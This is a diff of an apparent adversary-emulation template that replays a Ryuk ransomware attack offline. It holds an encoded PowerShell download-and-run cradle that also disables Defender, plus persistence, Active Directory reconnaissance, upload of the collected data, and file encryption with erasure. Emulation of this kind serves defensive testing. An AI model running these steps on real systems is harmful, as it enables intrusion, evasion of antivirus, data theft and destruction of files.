@@ -1,43 +1,38 @@
 {
     "threat": {
         "category": "User-Defined",
-        "description": "Ryuk Ransomware for Threat Thursday!",
-        "display_name": "Ryuk Ransomware",
-        "name": "Ryuk Ransomware",
+        "description": "Ryuk Ransomware emulation for Threat Thursday! Uses VFS for AdFind download (available offline)",
+        "display_name": "Ryuk_Offline",
+        "name": "Ryuk_Offline",
         "operating_system_name": "windows",
         "script": {
             "0": {
-                "conf": "--cp unicorn.scythedemo.com:443 --multipart 10240 --secure true",
+                "conf": "--cp 127.0.0.1:443 --multipart 10240 --secure true",
                 "module": "https",
                 "type": "initialization"
             },
             "1": {
-                "name": "REQUIRED",
-                "type": "assign",
-                "value": "INTERNET ACCESS"
-            },
-            "2": {
                 "name": "encryption_key",
                 "type": "assign",
                 "value": "ryuk_h3llo_world"
             },
-            "3": {
+            "2": {
                 "time": "10",
                 "type": "delay"
             },
-            "4": {
+            "3": {
                 "module": "loader",
                 "module_to_load": "run",
                 "request": "--load run",
                 "type": "message"
             },
-            "5": {
+            "4": {
                 "module": "loader",
                 "module_to_load": "downloader",
                 "request": "--load downloader",
                 "type": "message"
             },
-            "6": {
+            "5": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c mkdir %USERPROFILE%\\Desktop\\ryuk",
@@ -46,7 +41,7 @@
                 ],
                 "type": "message"
             },
-            "7": {
+            "6": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c mkdir %USERPROFILE%\\Desktop\\ryuk\\ryuk_adf",
@@ -55,7 +50,7 @@
                 ],
                 "type": "message"
             },
-            "8": {
+            "7": {
                 "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
                 "module": "downloader",
                 "request": "--src VFS:/shared/threats/Ryuk/taskkill.bat --dest %USERPROFILE%\\Desktop\\ryuk\\taskkill.bat",
@@ -64,7 +59,7 @@
                 ],
                 "type": "message"
             },
-            "9": {
+            "8": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c SCHTASKS /CREATE /SC DAILY /TN \"MyTasks\\Example Task\" /TR \"C:\\Windows\\System32\\calc.exe\" /ST 11:00 /F",
@@ -74,7 +69,7 @@
                 ],
                 "type": "message"
             },
-            "10": {
+            "9": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c SCHTASKS /QUERY /TN \"MyTasks\\Example Task\"",
@@ -84,13 +79,13 @@
                 ],
                 "type": "message"
             },
-            "11": {
+            "10": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c SCHTASKS /RUN /TN \"MyTasks\\Example Task\"",
                 "type": "message"
             },
-            "12": {
+            "11": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "powershell.exe -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgA3ADgAMAAxAC8AJwApADsAIABTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBEAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAAJAB0AHIAdQBlAA==",
@@ -100,7 +95,7 @@
                 ],
                 "type": "message"
             },
-            "13": {
+            "12": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "powershell Set-MpPreference -DisableRealtimeMonitoring $false",
@@ -109,12 +104,12 @@
                 ],
                 "type": "message"
             },
-            "14": {
+            "13": {
                 "name": "STEP",
                 "type": "assign",
                 "value": "PERSISTENCE & PROCESS DISCOVERY"
             },
-            "15": {
+            "14": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c REG ADD HKEY_CURRENT_USER\\Software\\ExampleRegKey /v Example /d \"Example Data\" /f",
@@ -123,7 +118,7 @@
                 ],
                 "type": "message"
             },
-            "16": {
+            "15": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c REG QUERY HKEY_CURRENT_USER\\Software\\ExampleRegKey",
@@ -132,7 +127,7 @@
                 ],
                 "type": "message"
             },
-            "17": {
+            "16": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c tasklist",
@@ -144,12 +139,12 @@
                 ],
                 "type": "message"
             },
-            "18": {
+            "17": {
                 "name": "STEP",
                 "type": "assign",
                 "value": "DAY1_DISCOVERY"
             },
-            "19": {
+            "18": {
                 "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
                 "module": "downloader",
                 "request": "--src VFS:/shared/threats/Ryuk/adf.bat --dest %USERPROFILE%\\Desktop\\ryuk\\adf.bat",
@@ -159,17 +154,17 @@
                 ],
                 "type": "message"
             },
-            "20": {
-                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+            "19": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
                 "module": "downloader",
-                "request": "--src \"https://www.joeware.net/downloads/files/AdFind.zip\" --dest \"%USERPROFILE%\\Desktop\\ryuk\\AdFind.zip\"",
+                "request": "--src VFS:/shared/threats/common_x64/AdFind.zip --dest \"%USERPROFILE%\\Desktop\\ryuk\\AdFind.zip\"",
                 "rtags": [
                     "att&ck",
                     "att&ck-technique:T1105"
                 ],
                 "type": "message"
             },
-            "21": {
+            "20": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c powershell -Command Expand-Archive \"%USERPROFILE%\\Desktop\\ryuk\\AdFind.zip\" -DestinationPath \"%USERPROFILE%\\Desktop\\ryuk\"",
@@ -179,11 +174,11 @@
                 ],
                 "type": "message"
             },
-            "22": {
+            "21": {
                 "time": "10",
                 "type": "delay"
             },
-            "23": {
+            "22": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c \"net view /all\"",
@@ -192,7 +187,7 @@
                 ],
                 "type": "message"
             },
-            "24": {
+            "23": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c \"net view /all /domain\"",
@@ -201,7 +196,7 @@
                 ],
                 "type": "message"
             },
-            "25": {
+            "24": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c nltest /domain_trusts > %USERPROFILE%\\Desktop\\ryuk\\ryuk_adf\\ad_trustdmp.txt",
@@ -210,7 +205,7 @@
                 ],
                 "type": "message"
             },
-            "26": {
+            "25": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c net group \"Domain Admins\" /do",
@@ -219,7 +214,7 @@
                 ],
                 "type": "message"
             },
-            "27": {
+            "26": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c type %USERPROFILE%\\Desktop\\ryuk\\ryuk_adf\\ad_trustdmp.txt",
@@ -229,7 +224,7 @@
                 ],
                 "type": "message"
             },
-            "28": {
+            "27": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c net group \"Enterprise Admins\" /domain",
@@ -238,7 +233,7 @@
                 ],
                 "type": "message"
             },
-            "29": {
+            "28": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c \"start %USERPROFILE%\\Desktop\\ryuk\\adf.bat\"",
@@ -248,11 +243,11 @@
                 ],
                 "type": "message"
             },
-            "30": {
+            "29": {
                 "time": "300",
                 "type": "delay"
             },
-            "31": {
+            "30": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c type %USERPROFILE%\\Desktop\\ryuk\\ryuk_adf\\ad_users.txt",
@@ -262,7 +257,7 @@
                 ],
                 "type": "message"
             },
-            "32": {
+            "31": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c type %USERPROFILE%\\Desktop\\ryuk\\ryuk_adf\\ad_computers.txt",
@@ -272,7 +267,7 @@
                 ],
                 "type": "message"
             },
-            "33": {
+            "32": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c type %USERPROFILE%\\Desktop\\ryuk\\ryuk_adf\\trustdump.txt",
@@ -282,7 +277,7 @@
                 ],
                 "type": "message"
             },
-            "34": {
+            "33": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c type %USERPROFILE%\\Desktop\\ryuk\\ryuk_adf\\subnets.txt",
@@ -292,7 +287,7 @@
                 ],
                 "type": "message"
             },
-            "35": {
+            "34": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c type %USERPROFILE%\\Desktop\\ryuk\\ryuk_adf\\domainlist.txt",
@@ -302,7 +297,7 @@
                 ],
                 "type": "message"
             },
-            "36": {
+            "35": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c type %USERPROFILE%\\Desktop\\ryuk\\ryuk_adf\\dcmodes.txt",
@@ -312,7 +307,7 @@
                 ],
                 "type": "message"
             },
-            "37": {
+            "36": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c type %USERPROFILE%\\Desktop\\ryuk\\ryuk_adf\\adinfo.txt",
@@ -322,7 +317,7 @@
                 ],
                 "type": "message"
             },
-            "38": {
+            "37": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c type %USERPROFILE%\\Desktop\\ryuk\\ryuk_adf\\dclist.txt",
@@ -332,7 +327,7 @@
                 ],
                 "type": "message"
             },
-            "39": {
+            "38": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c type %USERPROFILE%\\Desktop\\ryuk\\ryuk_adf\\computers_pwdnotreqd.txt",
@@ -342,7 +337,7 @@
                 ],
                 "type": "message"
             },
-            "40": {
+            "39": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "powershell \"Compress-Archive %USERPROFILE%\\Desktop\\ryuk\\ryuk_adf %USERPROFILE%\\Desktop\\ryuk\\ryuk_adf.zip\"",
@@ -352,13 +347,13 @@
                 ],
                 "type": "message"
             },
-            "41": {
+            "40": {
                 "module": "loader",
                 "module_to_load": "uploader",
                 "request": "--load uploader",
                 "type": "message"
             },
-            "42": {
+            "41": {
                 "depends_on": "80a402f2-e448-4818-ab8f-2047a033faea",
                 "module": "uploader",
                 "request": "--remotepath \"%USERPROFILE%\\Desktop\\ryuk_adf.zip\"",
@@ -368,22 +363,22 @@
                 ],
                 "type": "message"
             },
-            "43": {
+            "42": {
                 "time": "10",
                 "type": "delay"
             },
-            "44": {
+            "43": {
                 "name": "STEP",
                 "type": "assign",
                 "value": "DAY2_DISCOVERY&EXFIL"
             },
-            "45": {
+            "44": {
                 "module": "loader",
                 "module_to_load": "sysinfo",
                 "request": "--load sysinfo",
                 "type": "message"
             },
-            "46": {
+            "45": {
                 "depends_on": "14ba9c44-45b7-4630-b252-ad578faaeba9",
                 "module": "sysinfo",
                 "request": "",
@@ -395,13 +390,13 @@
                 ],
                 "type": "message"
             },
-            "47": {
+            "46": {
                 "module": "loader",
                 "module_to_load": "upsh",
                 "request": "--load upsh",
                 "type": "message"
             },
-            "48": {
+            "47": {
                 "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
                 "module": "upsh",
                 "request": "--cmd Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct",
@@ -410,7 +405,7 @@
                 ],
                 "type": "message"
             },
-            "49": {
+            "48": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c nltest /dclist:",
@@ -419,7 +414,7 @@
                 ],
                 "type": "message"
             },
-            "50": {
+            "49": {
                 "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
                 "module": "downloader",
                 "request": "--src \"VFS:/shared/threats/Ryuk/PowerView.ps1\" --dest \"%USERPROFILE%\\Desktop\\ryuk\\PowerView.ps1\"",
@@ -428,7 +423,7 @@
                 ],
                 "type": "message"
             },
-            "51": {
+            "50": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "powershell.exe -exec bypass -Command \"&{Import-Module %USERPROFILE%\\Desktop\\ryuk\\PowerView.ps1;Get-NetSubnet}\"",
@@ -437,7 +432,7 @@
                 ],
                 "type": "message"
             },
-            "52": {
+            "51": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "powershell.exe -exec bypass -Command \"&{Import-Module %USERPROFILE%\\Desktop\\ryuk\\PowerView.ps1;Get-NetComputer}\"",
@@ -446,7 +441,7 @@
                 ],
                 "type": "message"
             },
-            "53": {
+            "52": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "powershell.exe -exec bypass -Command \"&{Import-Module %USERPROFILE%\\Desktop\\ryuk\\PowerView.ps1;Invoke-CheckLocalAdminAccess}\"",
@@ -455,7 +450,7 @@
                 ],
                 "type": "message"
             },
-            "54": {
+            "53": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "powershell.exe -exec bypass -Command \"&{Import-Module %USERPROFILE%\\Desktop\\ryuk\\PowerView.ps1;Find-LocalAdminAccess}\"",
@@ -464,30 +459,30 @@
                 ],
                 "type": "message"
             },
-            "55": {
+            "54": {
                 "name": "STEP",
                 "type": "assign",
                 "value": "RANSOMWARE"
             },
-            "56": {
+            "55": {
                 "module": "loader",
                 "module_to_load": "file",
                 "request": "--load file",
                 "type": "message"
             },
-            "57": {
+            "56": {
                 "module": "loader",
                 "module_to_load": "search",
                 "request": "--load search",
                 "type": "message"
             },
-            "58": {
+            "57": {
                 "module": "loader",
                 "module_to_load": "crypt",
                 "request": "--load crypt",
                 "type": "message"
             },
-            "59": {
+            "58": {
                 "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
                 "request": "cmd /c mkdir \"%USERPROFILE%\\Desktop\\ryuk\\ryuk_target_files\"",
@@ -496,7 +491,7 @@
                 ],
                 "type": "message"
             },
-            "60": {
+            "59": {
                 "depends_on": "e96eccc9-6c98-4246-b809-1849684c7df2",
                 "module": "file",
                 "request": "--create --path \"%USERPROFILE%\\Desktop\\ryuk\\ryuk_target_files\\target_file.xls\" --size 5MB --count 10 --random",
@@ -505,7 +500,7 @@
                 ],
                 "type": "message"
             },
-            "61": {
+            "60": {
                 "depends_on": "046fad0b-04e5-440e-bd3f-da82195adae5",
                 "module": "search",
                 "request": "--directory \"%USERPROFILE%\\Desktop\\ryuk\" --filename \"target_file.xls\" --recurse",
@@ -514,7 +509,7 @@
                 ],
                 "type": "message"
             },
-            "62": {
+            "61": {
                 "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
                 "module": "upsh",
                 "request": "--cmd \"Compress-Archive -Path $env:userprofile\\Desktop\\ryuk\\ryuk_target_files -CompressionLevel Optimal -Destination $env:userprofile\\Desktop\\ryuk\\exfil.zip\"",
@@ -523,16 +518,16 @@
                 ],
                 "type": "message"
             },
-            "63": {
+            "62": {
                 "depends_on": "ff705b65-037a-4f06-b21e-e74e6cfe32bc",
                 "module": "crypt",
-                "request": "--target %USERPROFILE%\\Desktop\\ryuk\\ryuk_target_files --encrypt --password $(2).response --recurse --erase",
+                "request": "--target %USERPROFILE%\\Desktop\\ryuk\\ryuk_target_files --encrypt --password $(1).response --recurse --erase",
                 "rtags": [
                     "att&ck-technique:T1486"
                 ],
                 "type": "message"
             },
-            "64": {
+            "63": {
                 "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
                 "module": "downloader",
                 "request": "--src \"VFS:/shared/threats/Ryuk/RyukReadMe.txt\" --dest %USERPROFILE%\\Desktop\\ryuk\\RyukReadMe.txt",
@@ -541,12 +536,12 @@
                 ],
                 "type": "message"
             },
-            "65": {
+            "64": {
                 "name": "STEP",
                 "type": "assign",
                 "value": "CLEANUP"
             },
-            "66": {
+            "65": {
                 "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
                 "module": "run",
                 "request": "cmd /c REG DELETE HKEY_CURRENT_USER\\Software\\ExampleRegKey /f",
@@ -556,7 +551,7 @@
                 ],
                 "type": "message"
             },
-            "67": {
+            "66": {
                 "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
                 "module": "run",
                 "request": "cmd /c SCHTASKS /DELETE /TN \"MyTasks\\Example Task\" /F",
@@ -565,7 +560,7 @@
                 ],
                 "type": "message"
             },
-            "68": {
+            "67": {
                 "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
                 "module": "run",
                 "request": "cmd /c rmdir /Q /S \"%USERPROFILE%\\Desktop\\ryuk\"",
